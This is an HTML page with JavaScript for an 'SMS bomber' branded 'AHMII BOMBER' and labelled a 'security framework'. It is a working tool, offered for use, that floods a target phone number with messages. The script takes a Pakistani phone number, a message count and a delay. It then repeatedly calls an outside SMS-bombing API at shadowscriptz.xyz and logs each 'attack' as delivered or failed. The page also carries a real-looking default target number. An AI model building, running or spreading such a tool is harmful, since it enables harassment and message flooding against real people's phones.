<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="AHMII">
    <meta name="copyright" content="AHMII 2026">
    <title>✦ AHMII | SMS BOMBER ✦ Luxury Edition 2026</title>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700;800;900&family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background: linear-gradient(145deg, #0a0a0f 0%, #050508 100%);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* Luxury Animated Background */
        .luxury-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        
        .luxury-bg::before {
            content: '';
            position: absolute;
            width: 200%;
            height: 200%;
            background: radial-gradient(ellipse at 30% 40%, rgba(212, 175, 55, 0.08) 0%, transparent 50%),
                        radial-gradient(ellipse at 70% 60%, rgba(212, 175, 55, 0.05) 0%, transparent 50%);
            animation: slowDrift 30s infinite ease-in-out;
        }
        
        @keyframes slowDrift {
            0%, 100% { transform: translate(0, 0); }
            33% { transform: translate(-2%, -2%); }
            66% { transform: translate(2%, 2%); }
        }

        /* Floating Gold Orbs */
        .gold-orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(90px);
            opacity: 0.15;
            pointer-events: none;
            z-index: 0;
        }
        .orb1 {
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(212, 175, 55, 0.6), transparent);
            top: -200px;
            right: -200px;
            animation: floatGold 25s infinite;
        }
        .orb2 {
            width: 450px;
            height: 450px;
            background: radial-gradient(circle, rgba(212, 175, 55, 0.4), transparent);
            bottom: -180px;
            left: -180px;
            animation: floatGold 30s infinite reverse;
        }
        @keyframes floatGold {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(30px, -30px) scale(1.2); }
        }

        /* Main Container */
        .container {
            position: relative;
            z-index: 20;
            max-width: 560px;
            margin: 0 auto;
            padding: 28px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        /* Header - Luxury Style */
        .header {
            text-align: center;
            margin-bottom: 45px;
        }
        
        .logo-icon {
            font-size: 3.5rem;
            color: #D4AF37;
            text-shadow: 0 0 20px rgba(212, 175, 55, 0.4);
            margin-bottom: 15px;
            display: inline-block;
            animation: gentleGlow 3s infinite;
        }
        
        @keyframes gentleGlow {
            0%, 100% { text-shadow: 0 0 10px rgba(212, 175, 55, 0.3); }
            50% { text-shadow: 0 0 25px rgba(212, 175, 55, 0.6); }
        }
        
        .logo-text {
            font-family: 'Playfair Display', serif;
            font-size: 2.4rem;
            font-weight: 800;
            letter-spacing: 2px;
            background: linear-gradient(135deg, #D4AF37 0%, #F3E5AB 50%, #D4AF37 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 12px;
        }
        
        .logo-sub {
            font-size: 0.7rem;
            letter-spacing: 4px;
            color: rgba(212, 175, 55, 0.6);
            text-transform: uppercase;
            font-weight: 300;
        }
        
        .divider {
            width: 60px;
            height: 2px;
            background: linear-gradient(90deg, transparent, #D4AF37, transparent);
            margin: 20px auto 0;
        }

        /* Premium Card - Pure Luxury */
        .luxury-card {
            background: rgba(8, 8, 14, 0.75);
            backdrop-filter: blur(30px);
            border-radius: 56px;
            padding: 42px 36px;
            border: 1px solid rgba(212, 175, 55, 0.25);
            box-shadow: 0 35px 60px -25px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(212, 175, 55, 0.1) inset;
            transition: all 0.4s ease;
        }
        
        .luxury-card:hover {
            border-color: rgba(212, 175, 55, 0.5);
            box-shadow: 0 40px 70px -25px rgba(212, 175, 55, 0.15), 0 0 0 1px rgba(212, 175, 55, 0.2) inset;
        }

        /* Input Groups - Elegant */
        .input-group {
            margin-bottom: 28px;
        }
        
        .input-label {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 12px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: rgba(255, 255, 255, 0.6);
        }
        
        .input-label i {
            color: #D4AF37;
            font-size: 0.9rem;
        }
        
        .input-field {
            width: 100%;
            padding: 16px 24px;
            background: rgba(0, 0, 0, 0.45);
            border: 1.5px solid rgba(212, 175, 55, 0.2);
            border-radius: 60px;
            color: white;
            font-size: 1rem;
            font-weight: 500;
            font-family: 'Montserrat', monospace;
            transition: all 0.25s;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #D4AF37;
            box-shadow: 0 0 20px rgba(212, 175, 55, 0.15);
            background: rgba(0, 0, 0, 0.6);
        }
        
        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.2);
            font-weight: 400;
        }

        /* Format Options - Gold Accents */
        .format-row {
            display: flex;
            gap: 12px;
            margin-top: 14px;
            justify-content: center;
        }
        
        .format-option {
            background: rgba(212, 175, 55, 0.06);
            padding: 7px 18px;
            border-radius: 60px;
            font-size: 0.7rem;
            font-weight: 500;
            letter-spacing: 1px;
            color: rgba(212, 175, 55, 0.8);
            border: 0.5px solid rgba(212, 175, 55, 0.2);
            cursor: pointer;
            transition: 0.25s;
        }
        
        .format-option:hover {
            background: rgba(212, 175, 55, 0.15);
            border-color: rgba(212, 175, 55, 0.6);
        }

        /* Buttons - Royal Style */
        .btn-group {
            display: flex;
            gap: 18px;
            margin-top: 36px;
        }
        
        .btn {
            flex: 1;
            padding: 16px 18px;
            border: none;
            border-radius: 80px;
            font-size: 0.85rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-family: 'Montserrat', sans-serif;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #D4AF37, #B8960F, #D4AF37);
            background-size: 200% auto;
            color: #0a0a0f;
            box-shadow: 0 5px 20px rgba(212, 175, 55, 0.35);
        }
        
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 12px 28px rgba(212, 175, 55, 0.5);
            background-position: 100% 0;
        }
        
        .btn-secondary {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(212, 175, 55, 0.3);
            color: rgba(212, 175, 55, 0.9);
        }
        
        .btn-secondary:hover:not(:disabled) {
            background: rgba(212, 175, 55, 0.1);
            border-color: #D4AF37;
        }
        
        .btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        /* Elegant Progress */
        .progress-elegant {
            margin-top: 32px;
            display: none;
        }
        
        .progress-track {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 60px;
            height: 3px;
            overflow: hidden;
        }
        
        .progress-fill {
            background: linear-gradient(90deg, #D4AF37, #F3E5AB);
            width: 0%;
            height: 100%;
            border-radius: 60px;
            transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .progress-numbers {
            display: flex;
            justify-content: space-between;
            margin-top: 14px;
            font-size: 0.7rem;
            color: rgba(255, 255, 255, 0.45);
            letter-spacing: 1px;
        }

        /* Beautiful Message Toast */
        .message-toast {
            margin-top: 24px;
            padding: 16px 24px;
            border-radius: 60px;
            display: none;
            align-items: center;
            gap: 14px;
            animation: slideUp 0.4s ease;
            font-size: 0.85rem;
            font-weight: 500;
        }
        
        .message-toast.show {
            display: flex;
        }
        
        .message-toast.success {
            background: rgba(212, 175, 55, 0.12);
            border: 0.5px solid rgba(212, 175, 55, 0.4);
            color: #F3E5AB;
        }
        
        .message-toast.error {
            background: rgba(180, 100, 100, 0.1);
            border: 0.5px solid rgba(180, 100, 100, 0.3);
            color: #E8C8C8;
        }
        
        .message-toast i {
            font-size: 1.2rem;
        }
        
        .message-toast.success i { color: #D4AF37; }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(12px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Simple Log - Minimal Elegance */
        .log-elegant {
            margin-top: 28px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 48px;
            padding: 16px 20px;
            max-height: 130px;
            overflow-y: auto;
            font-size: 0.7rem;
            font-family: 'Montserrat', monospace;
            border: 0.5px solid rgba(212, 175, 55, 0.1);
        }
        
        .log-line {
            padding: 6px 0;
            border-bottom: 0.5px solid rgba(255, 255, 255, 0.02);
            color: rgba(255, 255, 255, 0.6);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .log-line.delivered { color: #D4AF37; }
        .log-line.failed { color: rgba(200, 120, 120, 0.8); }
        .log-line i { width: 20px; font-size: 0.7rem; }

        /* Footer */
        .footer {
            text-align: center;
            margin-top: 48px;
            font-size: 0.6rem;
            color: rgba(255, 255, 255, 0.2);
            border-top: 0.5px solid rgba(212, 175, 55, 0.08);
            padding-top: 28px;
            letter-spacing: 1px;
        }
        
        .footer .gold {
            color: #D4AF37;
            font-weight: 600;
        }

        /* Responsive */
        @media (max-width: 520px) {
            .container { padding: 20px; }
            .luxury-card { padding: 32px 24px; }
            .logo-text { font-size: 1.8rem; }
            .btn-group { flex-direction: column; gap: 12px; }
        }

        /* Attack Pulse */
        @keyframes royalPulse {
            0% { border-color: rgba(212, 175, 55, 0.2); }
            50% { border-color: rgba(212, 175, 55, 0.7); box-shadow: 0 0 0 6px rgba(212, 175, 55, 0.05); }
            100% { border-color: rgba(212, 175, 55, 0.2); }
        }
        
        .attacking {
            animation: royalPulse 1.3s infinite;
        }
        
        /* Hide scrollbar but keep functionality */
        .log-elegant::-webkit-scrollbar {
            width: 4px;
        }
        .log-elegant::-webkit-scrollbar-track {
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
        }
        .log-elegant::-webkit-scrollbar-thumb {
            background: #D4AF37;
            border-radius: 10px;
        }
    </style>
</head>
<body>

<div class="luxury-bg"></div>
<div class="gold-orb orb1"></div>
<div class="gold-orb orb2"></div>

<div class="container">
    <div class="header">
        <div class="logo-icon">
            <i class="fas fa-crown"></i>
        </div>
        <div class="logo-text">AHMII BOMBER</div>
        <div class="logo-sub">SMS SECURITY FRAMEWORK</div>
        <div class="divider"></div>
    </div>

    <div class="luxury-card">
        <div class="input-group">
            <div class="input-label"><i class="fas fa-phone-alt"></i> TARGET NUMBER</div>
            <input type="text" id="targetPhone" class="input-field" placeholder="923021234865" value="923021234865">
            <div class="format-row">
                <div class="format-option" data-val="92">🇵🇰 92XXXXXXXXXX</div>
                <div class="format-option" data-val="03">📱 03XXXXXXXXX</div>
                <div class="format-option" data-val="clear">🗑️ CLEAR</div>
            </div>
        </div>

        <div class="input-group">
            <div class="input-label"><i class="fas fa-bolt"></i> MESSAGES</div>
            <input type="number" id="msgQty" class="input-field" value="10" min="1" max="80">
        </div>

        <div class="input-group">
            <div class="input-label"><i class="fas fa-hourglass-half"></i> DELAY (MS)</div>
            <input type="number" id="msgDelayMs" class="input-field" value="600" min="300" max="2500">
        </div>

        <div class="btn-group">
            <button id="launchBtn" class="btn btn-primary"><i class="fas fa-feather-alt"></i> LAUNCH</button>
            <button id="stopBtn" class="btn btn-secondary" disabled><i class="fas fa-ban"></i> ABORT</button>
        </div>

        <div class="progress-elegant" id="progressPanel">
            <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
            <div class="progress-numbers">
                <span><i class="far fa-envelope"></i> <span id="sentAmount">0</span>/<span id="totalAmount">0</span></span>
                <span><i class="fas fa-check"></i> <span id="doneCount">0</span></span>
            </div>
        </div>

        <div id="statusToast" class="message-toast"></div>

        <div class="log-elegant" id="elegantLog">
            <div class="log-line"><i class="fas fa-info-circle"></i> AHMII system ready — enter target</div>
        </div>
    </div>

    <div class="footer">
        <p>✦ <span class="gold">AHMII</span> • CYBER SECURITY DIVISION • 2026 ✦</p>
        <p>premium testing framework</p>
    </div>
</div>

<script>
    // DOM Elements
    const launchButton = document.getElementById('launchBtn');
    const abortButton = document.getElementById('stopBtn');
    const phoneField = document.getElementById('targetPhone');
    const quantityField = document.getElementById('msgQty');
    const delayField = document.getElementById('msgDelayMs');
    const progressPanel = document.getElementById('progressPanel');
    const progressFill = document.getElementById('progressFill');
    const sentSpan = document.getElementById('sentAmount');
    const totalSpan = document.getElementById('totalAmount');
    const doneSpan = document.getElementById('doneCount');
    const toastDiv = document.getElementById('statusToast');
    const logContainer = document.getElementById('elegantLog');

    // State
    let isActive = false;
    let stopSignal = false;
    let sent = 0, delivered = 0;
    let total = 0;
    let activeTimout = null;

    const API_BASE = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=';

    // Helper: Show toast
    function displayToast(msg, isOk = true) {
        toastDiv.className = `message-toast ${isOk ? 'success' : 'error'} show`;
        toastDiv.innerHTML = `<i class="fas ${isOk ? 'fa-gem' : 'fa-skull'}"></i><span>${msg}</span>`;
        setTimeout(() => toastDiv.classList.remove('show'), 3500);
    }

    // Add log entry
    function addLogEntry(text, isDelivered = true) {
        const line = document.createElement('div');
        line.className = `log-line ${isDelivered ? 'delivered' : 'failed'}`;
        line.innerHTML = `<i class="fas ${isDelivered ? 'fa-crown' : 'fa-times'}"></i> ${text}`;
        logContainer.appendChild(line);
        line.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        while (logContainer.children.length > 45) logContainer.removeChild(logContainer.firstChild);
    }

    function clearLog() {
        logContainer.innerHTML = '<div class="log-line"><i class="fas fa-info-circle"></i> attack started — tracking messages...</div>';
    }

    // Convert number to intl format
    function toInternational(raw) {
        let clean = raw.replace(/\D/g, '');
        if (clean.startsWith('03') && clean.length === 11) return '92' + clean.slice(1);
        if (clean.startsWith('3') && clean.length === 10) return '92' + clean;
        if (clean.startsWith('92') && clean.length === 12) return clean;
        if (clean.startsWith('92') && clean.length > 12) return clean.slice(0,12);
        return clean;
    }

    function isValidInternational(num) {
        return /^92[0-9]{10}$/.test(num);
    }

    // Single API request
    async function sendOne(number, idx) {
        try {
            const ctrl = new AbortController();
            const timer = setTimeout(() => ctrl.abort(), 13000);
            const res = await fetch(API_BASE + number, { signal: ctrl.signal });
            clearTimeout(timer);
            const text = await res.text();
            const ok = res.ok || text.includes('success') || text.includes('sent') || text.includes('delivered');
            return { success: ok, raw: text };
        } catch (err) {
            return { success: false, error: err.message };
        }
    }

    function updateProgressBar() {
        const percent = total ? (sent / total) * 100 : 0;
        progressFill.style.width = `${percent}%`;
        sentSpan.innerText = sent;
        totalSpan.innerText = total;
        doneSpan.innerText = delivered;
    }

    function resetUI() {
        isActive = false;
        stopSignal = false;
        if (activeTimout) clearTimeout(activeTimout);
        launchButton.disabled = false;
        abortButton.disabled = true;
        phoneField.disabled = false;
        quantityField.disabled = false;
        delayField.disabled = false;
        document.querySelector('.luxury-card')?.classList.remove('attacking');
    }

    async function beginAttack() {
        if (isActive) return;

        let rawNumber = phoneField.value.trim();
        let amount = parseInt(quantityField.value);
        let delayVal = parseInt(delayField.value);

        if (!rawNumber) {
            displayToast('Enter target number', false);
            return;
        }

        const intlNumber = toInternational(rawNumber);
        if (!isValidInternational(intlNumber)) {
            displayToast('Use 92XXXXXXXXXX or 03XXXXXXXXX', false);
            return;
        }

        phoneField.value = intlNumber;

        if (isNaN(amount) || amount < 1) amount = 5;
        if (amount > 80) amount = 80;
        if (isNaN(delayVal)) delayVal = 600;
        if (delayVal < 300) delayVal = 300;
        if (delayVal > 2500) delayVal = 2500;

        // reset state
        isActive = true;
        stopSignal = false;
        sent = 0;
        delivered = 0;
        total = amount;

        launchButton.disabled = true;
        abortButton.disabled = false;
        phoneField.disabled = true;
        quantityField.disabled = true;
        delayField.disabled = true;
        progressPanel.style.display = 'block';
        clearLog();
        updateProgressBar();

        document.querySelector('.luxury-card')?.classList.add('attacking');
        displayToast(`✦ attack initiated → ${intlNumber} ✦`, true);
        addLogEntry(`LAUNCH — target: ${intlNumber} · total: ${amount}`, true);

        for (let i = 1; i <= amount; i++) {
            if (stopSignal || !isActive) {
                addLogEntry(`aborted by command`, false);
                displayToast('attack stopped', false);
                break;
            }

            const outcome = await sendOne(intlNumber, i);
            if (outcome.success) {
                delivered++;
                addLogEntry(`✓ msg ${i} · delivered to ${intlNumber}`, true);
            } else {
                addLogEntry(`✗ msg ${i} · failed`, false);
            }

            sent++;
            updateProgressBar();

            if (i < amount && delayVal > 0 && !stopSignal && isActive) {
                await new Promise(r => { activeTimout = setTimeout(r, delayVal); });
            }
        }

        if (!stopSignal && isActive) {
            if (delivered > 0) {
                displayToast(`✦ completed · ${delivered}/${sent} messages delivered ✦`, true);
                addLogEntry(`✦ completed — ${delivered} delivered ✦`, true);
            } else {
                displayToast(`⚠️ completed · 0 messages delivered`, false);
                addLogEntry(`⚠️ zero delivery — target may be invalid`, false);
            }
        }

        resetUI();
        setTimeout(() => { if (!isActive) progressPanel.style.display = 'none'; }, 800);
    }

    function haltAttack() {
        if (!isActive) return;
        stopSignal = true;
        isActive = false;
        if (activeTimout) clearTimeout(activeTimout);
        addLogEntry(`ABORT — attack halted`, false);
        displayToast('attack aborted', false);
        resetUI();
        progressPanel.style.display = 'none';
        document.querySelector('.luxury-card')?.classList.remove('attacking');
    }

    // Format buttons
    document.querySelectorAll('.format-option').forEach(btn => {
        btn.addEventListener('click', () => {
            const val = btn.getAttribute('data-val');
            if (val === '92') phoneField.value = '92';
            else if (val === '03') phoneField.value = '03';
            else if (val === 'clear') phoneField.value = '';
            phoneField.focus();
        });
    });

    phoneField.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        if (val.startsWith('92') && val.length > 12) val = val.slice(0,12);
        if (val.startsWith('03') && val.length > 11) val = val.slice(0,11);
        phoneField.value = val;
    });

    quantityField.addEventListener('change', () => {
        let v = parseInt(quantityField.value);
        if (v > 80) quantityField.value = 80;
        if (v < 1) quantityField.value = 1;
    });
    delayField.addEventListener('change', () => {
        let d = parseInt(delayField.value);
        if (d > 2500) delayField.value = 2500;
        if (d < 300) delayField.value = 300;
    });

    launchButton.addEventListener('click', beginAttack);
    abortButton.addEventListener('click', haltAttack);

    // Silent branding in console (no visible logs, just style)
    console.log('%c✨ AHMII SMS BOMBER — Luxury Edition 2026 ✨', 'color: #D4AF37; font-size: 12px; font-weight: bold;');
</script>
</body>
</html>
